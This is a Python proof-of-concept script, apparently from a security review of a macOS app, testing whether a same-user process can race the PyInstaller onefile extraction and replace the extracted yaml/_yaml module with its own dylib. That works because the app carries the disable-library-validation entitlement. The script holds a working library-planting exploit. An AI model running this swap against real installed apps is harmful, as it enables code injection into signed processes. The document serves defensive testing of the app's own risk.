#!/usr/bin/env python3
"""PoC of the residual risk of com.apple.security.cs.disable-library-validation on the onefile sidecar: an attacker
process of the SAME user that can write into the per-run extraction directory ($TMPDIR/_MEI*, mode 0700) replaces one
extracted extension module (yaml/_yaml, imported at start-up) with its own (ad-hoc signed) dylib between extraction and import. Marker file = code ran
inside the sidecar process. Usage: hr_plant.py <sidecar-binary> <label> <dylib>"""
import json, os, shutil, signal, subprocess, sys, threading, time, glob
import guilib as g
binary, label, dylib = sys.argv[1:4]
tmp = f"{g.GUI_WORK}/runs/plant-tmp-{int(time.time()*1000)}"; os.makedirs(tmp); home = f"{g.GUI_WORK}/runs/hr-home"
marker = f"{tmp}/../plant-marker-{label}"
try: os.unlink(marker)
except FileNotFoundError: pass
env = g.rd_env(home=home, tmp=tmp); env.update({"PROJECTS_PORT": "0", "PROJECTS_HOST": "127.0.0.1", "PROJECTS_BASE_PATH": "", "AGENTIC_OS_HANDOFF": "stdout", "HR_MARKER": marker})
stage = f"{tmp}/../plant-stage-{label}.dylib"; shutil.copyfile(dylib, stage)
done = {"planted": None}
def attacker():
    t0 = time.time()
    while time.time() - t0 < 15 and done["planted"] is None:
        for t in glob.glob(tmp + "/_MEI*/yaml/_yaml.cpython-312-darwin.so"):
            try:
                if os.path.getsize(t) > 100000:      # extraction of this file finished
                    os.replace(stage, t); done["planted"] = round((time.time() - t0) * 1000)
                    return
            except OSError: pass
        time.sleep(0.0005)
th = threading.Thread(target=attacker, daemon=True); th.start()
p = subprocess.Popen([binary, "serve", "--exit-on-stdin-eof"], env=env, cwd="/", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, start_new_session=True)
time.sleep(4)
res = {"label": label, "planted_at_ms": done["planted"], "marker_written": os.path.exists(marker), "marker": open(marker).read().strip() if os.path.exists(marker) else None, "process_alive_after_4s": p.poll() is None}
if p.poll() is not None:
    try: res["stderr_tail"] = p.stderr.read1(3000).decode(errors="replace")[-300:]
    except Exception: pass
try: p.stdin.close()
except Exception: pass
try: p.wait(timeout=8)
except Exception:
    try: os.killpg(p.pid, signal.SIGKILL)
    except Exception: pass
res["leftover_mei"] = g.mei_dirs(tmp)
print(json.dumps(res))
